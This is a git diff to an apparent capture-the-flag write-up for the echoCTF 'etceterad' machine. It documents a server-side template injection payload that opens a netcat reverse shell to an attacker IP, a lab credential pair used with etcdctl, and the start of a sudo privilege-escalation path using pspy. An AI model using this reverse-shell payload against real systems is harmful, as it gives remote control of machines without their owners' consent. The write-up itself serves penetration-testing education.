@@ -109,7 +109,7 @@ mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.
 OK
 ```
 We reload the web app on port `1337` and bingo!!! <br>
-![Leaked Creds](https://raw.githubusercontent.com/theMcSam/echoCTF-writeups/refs/heads/main/etceterad/images/ssti_1337_poc.png)
+![SSTI PoC](https://raw.githubusercontent.com/theMcSam/echoCTF-writeups/refs/heads/main/etceterad/images/ssti_1337_poc.png)
 
 After a number of google searches we find a payload that can help us execute code on the target. We can leverage this to spawn a reverse shell on the target. <br>
 Payload: `<%= process.mainModule.require('child_process').execSync('nc 10.10.1.126 8989 -e /bin/bash') %>`
@@ -143,3 +143,22 @@ User nodejs may run the following commands on etceterad:
     (ALL : ALL) NOPASSWD: /usr/local/sbin/fetch_keys
 ```
 
+We can see that we are allowed to run `/usr/local/sbin/fetch_keys` as any user on the machine. We will have to leverage this to hijack the process and obtain code execution as the root user.
+
+Unfortunately we have very limited permissions to `/usr/local/sbin/fetch_keys` and hence we cannot read the contents of the file.
+
+We will leverage another teachnique to determine what happens when the script is run. We will do that using `pspy`.
+
+Note that `pspy` does not come by default in linux and as a result we will have to download and transfer the binary to our target.
+
+To be able to do this efficiently we would need another session(reverse shell) on the target. We can monitor the activity with one shell while running the script from another shell to give us full visibility.
+
+Running the script `/usr/local/sbin/fetch_keys`.
+```
+mcsam@0x32:~/$ sudo /usr/local/sbin/fetch_keys
+Fetching /home/ETSCTF/.ssh/authorized_keys
+Fixing perms (0400)
+```
+
+Viewing events from `pspy`.
+![pspy output](https://raw.githubusercontent.com/theMcSam/echoCTF-writeups/refs/heads/main/etceterad/images/inspecting_ps_for_fetch_keys.png)
